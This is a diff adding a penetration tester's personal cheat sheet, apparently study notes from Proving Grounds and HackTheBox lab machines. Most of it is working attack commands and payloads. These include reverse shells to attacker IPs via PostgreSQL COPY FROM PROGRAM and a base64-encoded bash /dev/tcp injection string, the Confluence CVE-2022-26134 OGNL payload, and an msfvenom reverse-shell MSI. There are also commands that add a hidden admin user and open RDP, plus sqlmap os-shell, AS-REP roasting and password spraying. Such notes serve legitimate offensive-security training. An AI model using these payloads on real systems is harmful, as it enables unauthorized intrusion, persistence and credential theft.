@@ -1,0 +1,375 @@
+*************************[port maps]*************************
+
+
+wordlists
+
+vhosts:
+/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+
+parameter fuzzing:
+
+endpoints:
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+
+------------------------------------------------------
+extract emails from pages
+curl http://soccer.htb  | grep -E -o "\b[a-zA-Z0–9.-]+@[a-zA-Z0–9.-]+\.[a-zA-Z0–9.-]+\b"
+
+-------------------------------------------------
+time based mssql to RCE (ospg:butch)
+https://infosecwriteups.com/how-i-escalated-a-time-based-sql-injection-to-rce-bbf0d68cb398
+
+check the txt file i created for the payloads for testing
+indork: site:medium.com "microsoft sql  injection"
+----------------------------------------------
+while IFS= read -r line; do  curl "http://192.168.173.58/image.php?img=php://filter/read=convert.base64-encode/resource=../../../../..$line" | grep -oP '(?:[A-Za-z0-9+/]{4}){4,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4})' | base64 -d >> lfi.rest  ;done < /usr/share/linux-binaries/linux_lfi
+---------------------
+check the bypassed firewall ports for reverses shell
+------------------------------------------
+smtp-user-enum -w -f '<user@example.com>' -m RCPT -U /usr/share/wordlists/metasploit/unix_users.txt 192.168.173.97 25
+--------------------------------------
+if you have lfi try to read /root/.ssh/authorized_keys if the service running as ssytem you can read it
+--------------------------------
+grep -oP '(?<=[Open ] )\S+' allports | cut -d : -f 2 > ports
+------------------------------
+for i in $(cat ports);do echo -n $i,;done
+-----------------------------------------------
+lftp :~> set ftp:ssl-force true
+lftp :~> set ssl:verify-certfificate no
+ssl:verify-certfificate: no such variable. Use `set -a' to look at all variables.
+lftp :~> set ssl:verify-certificate no
+lftp :~> connect 192.168.173.20
+----------------------------------
+Bad enum connect the ports
+ is where my usual enumeration missed something small like a flag or addition scan to get better connection of the ports like in (ospg:hunit) missing / and (ospg:)
+
+Check all the anomalies with wfuzz do not rely on just --hl for example
+
+sudo nmap -Pn -n $IP -sU --top-ports=100 --reason // port 161 is important
+rustscan --addresses 192.168.189.125 --ulimit 5000 -- -A -sC -Pn -sV -T 1500
+
+windows local huh !
+
+(htb:Monteverde) crackmapexec smb 10.10.10.172 -u validusers.txt -p validusers.txt --continue-on-success
+
+
+For my bad enum always use -f with gobuster to discover api endpoints
+
+please search more on ports to not miss things like ident enum in (ospg:peppo)
+------------------------------------------------------------------------
+generating windows lol reverse shell like nc linux
+
+hta ods method (ospg:hepet) https://medium.com/@huwanyu94/proving-grounds-practice-hepet-walkthrough-ee7e051af47b
+
+which is similar to offsec/ippsec shingan
+
+or ippsec method cat cradle | iconv -t utf-16le | base64 -w0;echo
+--------------------------------------------------------------------
+f.last,first.last,last.first,flast,first,last,firstlast,l.first,lfirst
+--------------------------------------------------------------------------
+phone numbers can be user:pass (ospg:badcorp)
+----------------------------------------------------
+https://systemweakness.com/proving-grounds-badcorp-walkthrough-54c393758380
+cp -rf to ce privesc
+Command Injection vulnerability with ;id;# 
+(badcorp)
+-----------------
+CVE-2018-16858 for odt macros rce (ospg:craft2)
+------------------------------------
+APIs extensions need / at the end of the dir name (hunit)
+---------------------------
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add 240.0.0.1/32 dev ligolo
+-----------------------------------------------------
+/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("Exec-Output",#a))}/
+
+this was the  payload executed for Atlassian Confluence 7.13.6 CVE-2022-26134
+might help for other boxes (ospg:flu)
+--------------------------------------------------------------------
+[*] sometimes other third party protocols helps you to escalate because the protocol gives you control over folders that root use like ftp what happened in (ospg:badcorp) and git in (ospg:hunit)
+-------------------------------------
+rid brute force
+netexec smb 192.168.248.39  -u 'DoesNotExec' -p '' --rid-brute
+reproasting 
+netexec ldap  192.168.248.158  -u users.kerb   -p '' --asreproast roast.txt
+asreproast mostly need auth so this is un auth method
+impacket-GetUserSPNs  -no-preauth Guest -usersfile users.kerb -dc-host 192.168.248.158 zeus.corp/
+
+-----------------------------------------
+for i in $(grep -oP '(?<=[Open ] )\S+' allports | cut -d : -f 2| sort -u);do echo -n $i,;done
+---------------------------------------------------------------
+(ospg:hepet) good example of connect the ports of 143 
+[*] 143 enables you to read the inbox of someone and connecting port via email
+----------------------------------------------------------
+SQLMAP deleting cache
+/home/kali/.local/share/sqlmap/output/192.168.248.211
+------------------------------------------------------------
+(ospg:election1) the best example of sql to cmd if you reviewed burpsuite of sqlmap using
+sqlmap -r sql.req  --level=5 --risk=3 --os-shell -p id
+---------------------------------------------------------------
+to create jar payload use the exploit script from (ospg:) 
+----------------------------------------------------------------
+[*] postgresql - give you rce (ospg:peppo)
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.45.162/80 0>&1"';SELECT * FROM cmd_exec;
+----------------------------------------------------------------------
+[*] 113 (FreeBSD identd) - enum for users
+-------------------------------------------------
+site:medium.com ... in connect the ports is like find -user and ps -ef in workstation specifics which considered a replacement for the thing i wanted to tell saleh about which is the remote-mouse.exe served to daren to know the open ports exploits where i watned to tell saleh we should to a website to organize these
+------------------------------------------------------------------------------
+[*] any form can be xxe - allow to read files (ospg:glider) 
+------------------------------------------------
+[*] index.php - can give you rce ! yes sometimes you can control vulnerable php func
+(ospg:glider)
+
+here the preg_replace got rce
+---------------------------------------
+[*] rpcclient - enables you to read the desc of the machine users which could give you pass for a user and initial access 
+--------------------------------------------------------
+after rustscan, directly edit the hosts file so that nmap scans show you the names instead of you going back and forth from host to nmap scan to  check 
+----------------------------------------------
+basic base64 http
+medusa -h 127.0.0.1  -u admin  -P /usr/share/wordlists/rockyou.txt  -M http -m BASIC   -t 5 -n 9090
+---------------------------------------------------------------------------------------------------------
+captcha parameter dropped into eval for calculation which cause reverse shell (ospg:prostore)
+----------------------------------------------------------------------------------------------------------
+[*] SSRF - allows you to read files in the system (ospg:symbolic)
+--------------------------------------------------
+"default or safe or vuln or exploit or fuzzer or version or discovery or auth" 
+-----------------------------------------------------------------------
+find endpoints
+
+wfuzz --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.91:5000/FUZZ
+-----------------------------------------------------------------------
+https://medium.com/purplebox/methods-for-exploiting-file-upload-vulnerabilities-c046f9946b62
+(ospg:access) many ways  to bypass extension blacklist
+-------------------------------------------
+advanced port specifics
+nmap --script "default or safe or vuln or exploit or fuzzer or version or discovery or auth"   -sV -oN advsc -p - 
+-----------------------------------------------------
+filtering enum4linux or rpcclient domusersenum
+cat users.txt | awk -F\\[ '{print $2}' | awk -F\\] '{print $1}' > final_user.txt
+-----------------------------------------------
+
+
+
+*************************[workstation specifics]*************************
+[there are things you can do in this workstaions with this user that you can not do on the other workstations which will get you a domaion user]
+
+
+---------------------------------------------
+(ospg:hetemit) privesc via .service
+--------------------------------------------
+git shell.Privilege Escalation Vector
+https://medium.com/@bdsalazar/proving-grounds-hunit-intermediate-linux-box-walkthrough-a-journey-to-offensive-security-36081fc196d
+(ospg:hunit)
+-------------------
+excluded directories
+
+Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+
+-------------------------------------------------------------
+sometimes a running services in the system has features that  enables you to get root like the air2webui box (ospg:air)
+-------------------------------------------------------
+;echo${IFS}YmFzaCAtaSAgPiYgICAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE2Ni80NDMgMD4mMSAK|base64${IFS}-d|bash;#
+# base64 command: bash -i >& /dev/tcp/192.168.45.166/443 0>&1
+--------------------------------------------
+if all your command line injections withht he script does not work utilize metasploit
+------------------------------------------------------------
+[*] workstation specifics/group specifics  - once you get a domain or local  user try the ntlm relya taught in offsec to see if the same user with the same creds in another box for password reuse which might be a fast win for workstation specfics
+-------------------------------------------------------------------------------
+[*] the application running that got you connecting the ports can also be a workstation specific that make you escalate like in (ospg:fired) getting root password or (ospg:air ) giving you a functionality that is run as a root to get escalated that is why it is important to enumerate the files of the app using find / -name '*appname*t' 2>/dev/null or google the conf files of that app
+---------------------------------------------------
+[*] In windows port 443 is allowed outbound does not mean it is allowed in bound though
+-------------------------------------------------------------------
+Hydra is case sensitive for users and crackmapexec is not
+-----------------------------------------------------------------
+[*] (ospg:nukem) the best resource to what  to do for workstation specifics if you have arbitrary write
+and remember even if the binary say something like error check if the action don to not fall in the same dosbox mis understanding becuase i mistakingly over written proof.txt
+----------------------------------------------------------
+to know the .net version installed in the workstation
+
+reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s
+Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse
+----------------------------------------------------------
+if the %PATH% is ruined
+set PATH=%PATH%;C:\windows\system32;C:\windows;C:\windows\System32\Wbem;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\OpenSSH\;C:\Program Files\dotnet\
+----------------------------------------------------------------------------------------
+allow rdp 
+
+gp4.exe -cmd "cmd /c net user mamathere P@ssword123 /add"
+gp4.exe -cmd "cmd /c net localgroup administrators /add mamathere"
+
+gp4.exe -cmd "cmd /c reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"fDenyConnections\" /t REG_DWORD /d 0 /f"
+
+gp4.exe -cmd "cmd /c reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v \"TSEnabled\" /t REG_DWORD /d 1 /f"
+
+gp4.exe -cmd "cmd /c reg add \"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0 /f"
+
+gp4.exe -cmd "cmd /c netsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=Yes"
+
+gp4.exe -cmd "cmd /c sc config TermService start=auto"
+
+gp4.exe -cmd "cmd /c net start TermService"
+
+xfreerdp /u:mamathere /p:'P@ssword123' /v:192.168.210.66
+
+-------------------------------------------------------------------
+in the linpeas result the suid/files with interesting perms and you do not have sudo 
+does not  mean you can not exploit them becuase they might have cve (ospg:election1) also because of pwnkit does not mean all the kernel exps are cheating it might be a real workstation specifics
+----------------------------------------------------------------------------------
+bad enum workstation specifics
+find -type f -user yash 2>/dev/null (ospg:noname)
+--------------------------------------------------------
+python -m pyftpdlib --write (TCM)
+-------------------------------------
+
+reg  query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
+reg  query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
+msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+
+------------------------------------------------
+[*] hping3 --icmp - allows you to read root files (ospg:icmp)
+---------------------------------------------------
+nice /notes/* can be bypassed with ../ to get privesc (ospg:potato)
+-------------------------------------------------------------
+docker skipping (ospg:peppo)
+https://0xffsec.com/handbook/shells/restricted-shells/
+------------------------------------
+when you want a user use things that grep the user things in the workstation specifics like find / -user or pspy that show the user things (ospg:lavita)
+
+https://accesscheck.medium.com/hack-the-box-academy-writeup-without-metasploit-844acd7e2848 composer to root (ospg:lavita)
+------------------------------------------------------------
+elevate from uac medium
+elevationstation.exe -uac 192.168.45.162 445
+--------------------------------------------------
+(ospg:prostore)  this is my second time to forget  to check .env in a framework
+---------------------------------------------------------------------------------------
+(ospg:prostore) priv esc by pwngdbg to file the c file of a binary and knowing there is no input validation to run another commands
+-------------------------------------------------
+wmic service list brief
+--------------------------
+[*] filezilla 0.9.4 beta - allow you to priv esc 
+port scan can allow you to get priv esc as well (ospg:shenzi)
+--------------------------------------------------------------------
+https://medium.com/@toneemarqus/blue-htb-manual-walkthrough-2023-tonee-33caa8f71b51
+(ospg:internel) the above link is exploiting eternalblue manually
+
+
+git clone https://github.com/helviojunior/MS17-010 
+wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
+                                                                  
+python2.7 get-pip.py      
+                                                                          
+python2.7 -m pip install --upgrade pip setuptools
+                                                                      
+sudo python2.7 -m pip install --upgrade pip setuptools
+                                                                  
+python2.7 -m pip install impacket==0.9.20
+
+wget https://raw.githubusercontent.com/worawit/MS17-010/refs/heads/master/mysmb.py
+
+python2 42315.py 
+-=-------------------------------------------------------------------
+https://medium.com/@opabravo/file-upload-bypass-fuzz-magic-bytes-mime-types-with-ffuf-b218171533d4
+(ospg MZEEAV) you can fuzz the magicbytes that will bypass and be uploaded using
+ffuf -c --request-proto http -w <(while read h; do echo $(echo $h | xxd -r -p); done < /opt/wordlists/custom/magic_bytes_hex.txt) -request upload.req -fr 'Unsupported file type!'
+----------------------------------------------------------
+(htb:querier) Groups.xml path
+https://medium.com/@hughbrown123/walk-through-hints-querier-htb-0726d5b18961
+------------------------------------------------------------------------------------
+
+
+
+*************************[group specifics]*************************
+(ospg:hutch) LAPS enables you to get the domain admin password using ldap if enabled
+
+
+
+
+port maps under conditions
+
+https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/
+ - can enable you to have RCE when there is a zip file in the box that contain a rev.php (zipper)
+[*] XXE - enables you to read files 
+[*] 7za,7z wild card to privesc
+https://0xdf.gitlab.io/2024/08/10/htb-usage.html
+[*] LFI to rce - when the parameter request the file from external resource and inject in the page as src bbut python does not allow that 
+[*] next time try /home/user/id_rsa not .ssh only
+
+
+[+] traversal
+[*] you have a path traversal and a public service you should know where the conf files to get its passwords (ospg:clue)
+
+
+ftp
+[*] found local users can be tested with the same user
+
+
+gobuster
+[*] dir more to find the app version
+
+[*] XSS - enables you to steal the admins cookie and access as the admin if the form can be viewed by him and depend if the httponly flag is set or not (check the two ippsec videos formulax httponly set)
+
+[*] xss to php rce - if the parameter push the value as an img src it will execute the php content (ospg:)
+
+
+
+ALL 180
+29 -> Hard 
+[*] ssrf - enables you to read files with file:// if the vuln not in framework like python which will prevernt anythingother than the http protocol
+
+[*] lfi  - enables you to knows the password or current command running with reading
+/proc/self/cmdline
+
+[*] path traversal or lfi  creds dumping - read the web server config documentations to know where the passwords stored
+
+[*] path traversal to rce - after reading the /etc/passwd see the users and try to read their id_rsa
+
+[*]  type juggling/confusion - allow you to get RCE or bypass logins like php type juggling (ospg:potato)
+
+[*] login page ? possible SQL injection
+
+
+CVES and the scripts that exploit you must understand becasue it is the things that makes you better connecting the ports without the need for scripts
+
+
+
+--------------------------
+SQL INJECTION
+
+MSSQL 
+
++++++++++++++++++++++++
+
+methods to exploit stacked query ';
+(ospg:butch)
+https://infosecwriteups.com/how-i-escalated-a-time-based-sql-injection-to-rce-bbf0d68cb398 - indork: site:medium.com "microsoft sql  injection"
+
+https://medium.com/@alokkumar0200/owning-a-machine-using-xp-cmdshell-via-sql-injection-manual-approach-a380a5e2a340
+indork: site:medium.com "'; EXEC sp_configure"
+
+https://auspisec.com/blog/20220118/proving_grounds_butch_walkthrough.html
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+MYSQL
+
++++++++++++++++++++++
+(htb:soccer)
+https://mux0xx.medium.com/exploiting-blind-sql-injection-with-conditional-responses-without-sqlmap-abf1bd85e03e
+
+(htb:javis)
+methods to exploit union 
+https://medium.com/@aslam.mahimkar/blind-sqli-to-rce-remote-code-execution-jarvis-htb-walkthrough-1d96763bccef
+
+
+
++++++++++++++++++++++++++++
+
+
+like sqlmap: https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1
+indork: site:medium.com "';waitfor"
